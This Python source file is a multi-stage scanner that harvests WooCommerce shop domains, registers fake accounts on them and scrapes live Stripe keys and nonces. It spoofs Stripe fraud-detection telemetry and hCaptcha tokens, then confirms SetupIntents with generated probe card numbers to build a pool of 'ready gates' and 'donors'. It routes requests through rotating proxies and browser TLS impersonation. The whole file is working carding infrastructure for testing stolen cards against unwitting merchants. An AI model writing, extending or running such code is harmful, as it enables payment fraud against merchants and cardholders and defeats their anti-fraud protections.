# language: Python 3.12+, file: advanced_gate_scanner.py, target: Windows 11, deps: curl_cffi
import asyncio
import json
import os
import re
import socket
import sys
import time
from concurrent.futures import ThreadPoolExecutor
from curl_cffi.requests import AsyncSession

import gate_client as gc
import config

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")


def resolve_dns(host: str) -> str | None:
    try:
        socket.gethostbyname(host)
        return host
    except Exception:
        return None


async def probe_stage1_fast_surface(domain: str, sem: asyncio.Semaphore,
                                 proxy_pool: list[str] | None = None,
                                 explicit_proxy: str | None = None) -> dict | None:
    """Stage 1: Fast GET /my-account/ — check availability, register nonce & pk_live."""
    base = f"https://{domain}"
    url = f"{base}/my-account/"
    async with sem:
        try:
            # ротация на КАЖДЫЙ пробник — раньше весь стадий шёл с одного прокси
            proxy = gc.pick_proxy(proxy_pool, explicit_proxy)
            async with AsyncSession(impersonate=config.pick_impersonate(), verify=False, proxy=proxy) as s:
                r = await s.get(url, timeout=8)
                if r.status_code != 200:
                    return None
                html = r.text
        except Exception:
            return None

    if gc.is_cloudflare_challenge(html):
        return None

    reg_nonce = gc.extract_reg_nonce(html)
    if not reg_nonce:
        return None

    pk_live = gc.extract_pk_live(html) or None
    has_stripe_indicator = (
        pk_live is not None or
        "wc-stripe" in html or
        "stripe.js" in html or
        "wc_stripe" in html or
        "payment_method_stripe" in html
    )

    return {
        "domain": domain,
        "base": base,
        "reg_nonce": reg_nonce,
        "pk_live": pk_live,
        "has_stripe": has_stripe_indicator
    }


async def probe_stage2_3_4_qualification(domain: str, base: str, initial_nonce: str, sem: asyncio.Semaphore,
                                      proxy_pool: list[str] | None = None,
                                      explicit_proxy: str | None = None) -> dict | None:
    """Stage 2: Real registration POST -> check wordpress_logged_in.
       Stage 3: Scrape /my-account/add-payment-method/ -> extract pk_live, upe_nonce / legacy_nonce.
       Stage 4: Live SetupIntent confirm probe (Radar Telemetry v2021 + rotating Luhn-valid probe PAN).
    """
    async with sem:
        try:
            proxy = gc.pick_proxy(proxy_pool, explicit_proxy)
            async with AsyncSession(impersonate=config.pick_impersonate(), verify=False, proxy=proxy) as s:
                reg_url = f"{base}/my-account/"

                # Fresh page for form inspection & nonce freshness
                r_get = await s.get(reg_url, timeout=8)
                if r_get.status_code != 200:
                    return None
                html = r_get.text

                reg_nonce = gc.extract_reg_nonce(html) or initial_nonce
                ident = gc.random_identity()

                body = {
                    "email": ident["email"],
                    "password": ident["password"],
                    "woocommerce-register-nonce": reg_nonce,
                    "_wp_http_referer": "/my-account/",
                    "register": "Register",
                }
                if 'name="username"' in html:
                    body["username"] = ident["username"]
                gc.extract_honeypot_fields(gc.extract_register_form_html(html), body)

                await s.post(reg_url, data=body,
                             headers={"Origin": base, "Referer": reg_url}, timeout=12)

                cookies = s.cookies.get_dict()
                if not any("wordpress_logged_in" in k for k in cookies):
                    return None

                # === STAGE 3: Authenticated Scrape add-payment-method ===
                add_pm_url = f"{base}/my-account/add-payment-method/"
                r_pm = await s.get(add_pm_url, timeout=10)
                pm_html = r_pm.text

                if gc.looks_like_captcha(pm_html):
                    # Sprint 3.4: капча на add-card — донор жив для PI-confirm, помечаем
                    return {"domain": domain, "status": "CAPTCHA_ADDCARD",
                            "captcha_on_add_card": True}

                if "pk_test_" in pm_html and "pk_live_" not in pm_html:
                    return None

                # Фаза 5.1: Braintree-доноры рядом со Stripe
                bt = gc.extract_braintree_keys(pm_html)
                if bt["has_braintree"] and "pk_live_" not in pm_html:
                    return {"domain": domain, "status": "BRAINTREE_KEY",
                            "braintree_client_token": bool(bt["client_token"]),
                            "braintree_tokenization_key": bt["tokenization_key"]}

                scraped = gc.scrape_gate(pm_html)
                pk, upe_nonce, legacy_nonce = scraped["pk"], scraped["upe_nonce"], scraped["legacy_nonce"]
                if not pk or (not upe_nonce and not legacy_nonce):
                    return None

                # === STAGE 4: Live Mode Probe — v2021 telemetry + beacon-POST mint ===
                # Серверные fingerprint-токены из JSON ответа m.stripe.com/6
                live_ids = {"muid": "", "sid": "", "guid": ""}
                try:
                    r_m = await s.post("https://m.stripe.com/6",
                                       data=gc.m_stripe_beacon_payload(),
                                       headers={"Origin": "https://js.stripe.com",
                                                "Referer": "https://js.stripe.com/", "Accept": "*/*"},
                                       timeout=5)
                    if r_m.status_code == 200:
                        live_ids = gc.parse_m_stripe_response(r_m.json())
                except Exception:
                    pass

                telem = gc.stripe_telemetry(base, pk, muid=live_ids["muid"], sid=live_ids["sid"])
                if live_ids["guid"]:
                    telem["guid"] = live_ids["guid"]
                hc_token = await gc.fetch_hcaptcha_radar_token(s, pk, base)
                if hc_token:
                    telem["_hcaptcha_token"] = hc_token
                probe = gc.gen_probe_card()
                tok_body = gc.tokenize_body(probe, telem, base)

                r_tok = await s.post("https://api.stripe.com/v1/payment_methods",
                                     data=tok_body, headers=gc.TOKENIZE_HEADERS, timeout=8)
                tok_data = r_tok.json()
                if "id" not in tok_data:
                    return None

                pm_id = tok_data["id"]

                if upe_nonce:
                    conf_payload = {
                        "action": "wc_stripe_create_and_confirm_setup_intent",
                        "_ajax_nonce": upe_nonce,
                        "wc-stripe-payment-method": pm_id,
                        "wc-stripe-payment-type": "card",
                    }
                    ajax_endpoint = f"{base}/wp-admin/admin-ajax.php"
                else:
                    conf_payload = {"stripe_source_id": pm_id, "nonce": legacy_nonce}
                    ajax_endpoint = f"{base}/?wc-ajax=wc_stripe_create_setup_intent"

                r_conf = await s.post(ajax_endpoint, data=conf_payload,
                                      headers=gc.ajax_headers_for(base, add_pm_url), timeout=12)
                conf_resp = r_conf.json()

                raw_str = json.dumps(conf_resp).lower()
                # livemode-детект: строгое поле JSON, а не любой 'false' в тексте —
                # success:false + livemode:true это штатный live-decline ответ плагина
                if ("testmode_charges_only" in raw_str
                        or "secret_key_required" in raw_str
                        or re.search(r'"livemode"\s*:\s*"?false', raw_str)):
                    return None

                is_live_verdict = (
                    conf_resp.get("success") is True or
                    "declined" in raw_str or
                    "incorrect" in raw_str or
                    "requires_action" in raw_str or
                    "succeeded" in raw_str or
                    "card_error" in raw_str
                )

                if is_live_verdict:
                    return {
                        "domain": domain,
                        "base_url": base,
                        "reg_url": reg_url,
                        "add_pm_url": add_pm_url,
                        "ajax_url": ajax_endpoint,
                        "pk_live": pk,
                        "gate_type": "wc_stripe_upe" if upe_nonce else "wc_stripe_legacy",
                        "upe_nonce": upe_nonce,
                        "legacy_nonce": legacy_nonce,
                        "updated_at": int(time.time()),
                        "status": "READY"
                    }
        except Exception:
            return None
    return None


async def main():
    raw_args = sys.argv[1:]
    explicit_proxy = None
    while "--proxy" in raw_args:
        i = raw_args.index("--proxy")
        if i + 1 < len(raw_args):
            explicit_proxy = raw_args[i + 1]
            del raw_args[i:i + 2]
        else:
            del raw_args[i]
    proxy_pool = gc.load_proxies()
    proxy_label = (f"--proxy {explicit_proxy}" if explicit_proxy
                   else (f"{len(proxy_pool)} from data/proxies.txt" if proxy_pool else "direct (no pool)"))

    print("=" * 80)
    print("[*] ADVANCED GATE SCANNER v5 (curl_cffi Chrome TLS + Shared Gate Engine)")
    print(f"[*] Proxy: {proxy_label}")
    print("=" * 80)

    # 1. Load candidate domains — Sprint 3.1: SQLite-очередь первична,
    #    txt-файлы остаются fallback'ом до первого наполнения db
    raw_domains: list[str] = []
    try:
        import domains_store
        HAS_DB = True
        domains_store.init_db()
        due = domains_store.due_for_scan(hours=config.RESCAN_INTERVAL_HOURS)
        if due:
            raw_domains = [r["domain"] for r in due]
            print(f"[*] Source: data/domains.db queue — {len(raw_domains)} due (>24h or never scanned)")
    except Exception as e:
        HAS_DB = False
        print(f"[!] db queue unavailable ({e}) — falling back to txt lanes")

    if not raw_domains:
        domains = []
        candidates = [
            "data/harvested_domains.txt",   # forums harvester lane
            "data/dork_harvested.txt",      # dork harvesters lane
            "data/probe_targets.txt",       # manual targets
            "harvested_domains.txt", "probe_targets.txt",  # legacy cwd fallbacks
        ]
        for fn in candidates:
            if os.path.exists(fn):
                try:
                    with open(fn, encoding="utf-8") as f:
                        domains.extend([l.strip() for l in f if l.strip() and not l.startswith("#")])
                except Exception:
                    pass

        junk = ['blogspot', '1drv.ms', 'supportally', 'abc.com', 'google', 'wordpress', 'github', 'pastebin', 'gravatar']
        cleaned = []
        for d in domains:
            d = re.sub(r'[^a-z0-9.-]', '', d.strip().lower())
            if d and "." in d and not d.endswith(".") and not any(j in d for j in junk):
                cleaned.append(d)
        raw_domains = sorted(list(set(cleaned)))
    print(f"[*] Loaded {len(raw_domains)} sanitized candidate domains.", flush=True)

    # Load existing verified ready gates to preserve them
    existing_ready = []
    ready_file = os.path.join("data", "ready_gates.json")
    if os.path.exists(ready_file):
        try:
            with open(ready_file, "r", encoding="utf-8") as f:
                data = json.load(f)
                if isinstance(data, list):
                    existing_ready = data
            print(f"[*] Loaded {len(existing_ready)} existing ready gates from pool.")
        except Exception:
            pass

    # 2. DNS resolve
    print("[*] Stage 0: Pre-resolving DNS...", flush=True)
    live_dns_domains = []
    with ThreadPoolExecutor(max_workers=50) as pool:
        results = pool.map(resolve_dns, raw_domains)
        for r in results:
            if r:
                live_dns_domains.append(r)
    print(f"[+] DNS Live: {len(live_dns_domains)} / {len(raw_domains)}", flush=True)

    # 3. Stage 1: Fast Surface Probing
    print(f"\n[*] Stage 1: Fast Surface Probing on {len(live_dns_domains)} domains...", flush=True)
    sem_s1 = asyncio.Semaphore(30)
    s1_tasks = [probe_stage1_fast_surface(d, sem_s1,
                                          proxy_pool=proxy_pool, explicit_proxy=explicit_proxy)
                for d in live_dns_domains]
    s1_results = await asyncio.gather(*s1_tasks)
    s1_passed = [r for r in s1_results if r]
    print(f"[+] Stage 1 Passed: {len(s1_passed)} clean domains with open registration forms.")

    # 4. Stages 2-4: Deep Qualification
    print(f"\n[*] Stages 2-4: Deep Qualification (Session Reg -> Scrape Nonces -> Confirm Probe)...", flush=True)
    sem_deep = asyncio.Semaphore(15)
    deep_tasks = [
        probe_stage2_3_4_qualification(s["domain"], s["base"], s["reg_nonce"], sem_deep,
                                       proxy_pool=proxy_pool, explicit_proxy=explicit_proxy)
        for s in s1_passed
    ]
    deep_results = await asyncio.gather(*deep_tasks)
    new_ready_gates = [r for r in deep_results if r and r.get("status") == "READY"]
    captcha_hits = {r["domain"]: r for r in deep_results
                    if r and r.get("status") == "CAPTCHA_ADDCARD"}
    if captcha_hits:
        print(f"[*] Captcha on add-card: {len(captcha_hits)} donor(s) marked, kept for PI-confirm vector")

    # Sprint 3.1: результаты скана — обратно в db
    bt_targets = []
    if HAS_DB:
        try:
            ready_set = {g["domain"] for g in new_ready_gates}
            for d in live_dns_domains:
                if d in ready_set:
                    domains_store.mark_scanned(d, "READY")
                    continue
                r = next((x for x in deep_results
                          if x and x.get("domain") == d), None)
                if captcha_hits.get(d):
                    domains_store.mark_scanned(d, "CAPTCHA_ADDCARD")
                elif r and r.get("status") == "BRAINTREE_KEY":
                    domains_store.mark_scanned(d, "BRAINTREE_KEY")
                    bt_targets.append(r)
                else:
                    domains_store.mark_scanned(d, "NO_REG")
        except Exception as e:
            print(f"[!] db writeback failed: {e}")

    # Merge + TTL prune (Пакет 3): подтверждённые сейчас — READY, fail_count=0;
    # неподтверждённые STALE_AFTER..GATE_TTL часов — метка STALE; старше — удаление.
    import config
    now = int(time.time())
    STALE_AFTER = config.STALE_AFTER_HOURS * 3600
    GATE_TTL = config.GATE_TTL_HOURS * 3600
    confirmed = {g["domain"]: g for g in new_ready_gates}
    final_ready_gates = []
    for g in existing_ready:
        dom = g.get("domain")
        if dom in confirmed:
            continue  # свежее подтверждение заменит запись
        age = now - int(g.get("updated_at", 0))
        if age > GATE_TTL:
            print(f"  [prune] {dom}: TTL expired ({age // 3600}h unconfirmed) — removed from pool", flush=True)
            continue
        if age > STALE_AFTER and g.get("status") == "READY":
            g["status"] = "STALE"
            print(f"  [stale] {dom}: unconfirmed {age // 3600}h — marked STALE", flush=True)
        final_ready_gates.append(g)
    for dom, g in confirmed.items():
        g["updated_at"] = now
        g["fail_count"] = 0
        g["status"] = "READY"
        final_ready_gates.append(g)
    # Sprint 3.4: captcha-флаг пишется в существующие записи пула (донор не выбрасывается)
    for dom in captcha_hits:
        for g in final_ready_gates:
            if g.get("domain") == dom:
                g["captcha_on_add_card"] = True

    # Фаза 5.1: Braintree-цели — в отдельный файл для bot gate #4
    if bt_targets:
        os.makedirs("data", exist_ok=True)
        with open("data/braintree_targets.txt", "w", encoding="utf-8") as f:
            for r in bt_targets:
                f.write(f"https://{r['domain']}\n")
        print(f"[+] {len(bt_targets)} Braintree target(s) -> data/braintree_targets.txt")

    print("\n" + "=" * 80)
    print(f"[🔥] FINAL QUALIFIED SETUPINTENT GATES IN POOL: {len(final_ready_gates)}")
    print("=" * 80)

    for g in final_ready_gates:
        pk_display = g.get('pk_live', '')[:24] + "..." if g.get('pk_live') else "N/A"
        print(f"  [READY] {g['domain']:32} | Type: {g.get('gate_type', 'unknown'):18} | PK: {pk_display}")

    os.makedirs("data", exist_ok=True)
    with open(ready_file, "w", encoding="utf-8") as f:
        json.dump(final_ready_gates, f, indent=2)

    print(f"\n[+] Saved {len(final_ready_gates)} ready gates to {ready_file}")


if __name__ == "__main__":
    asyncio.run(main())
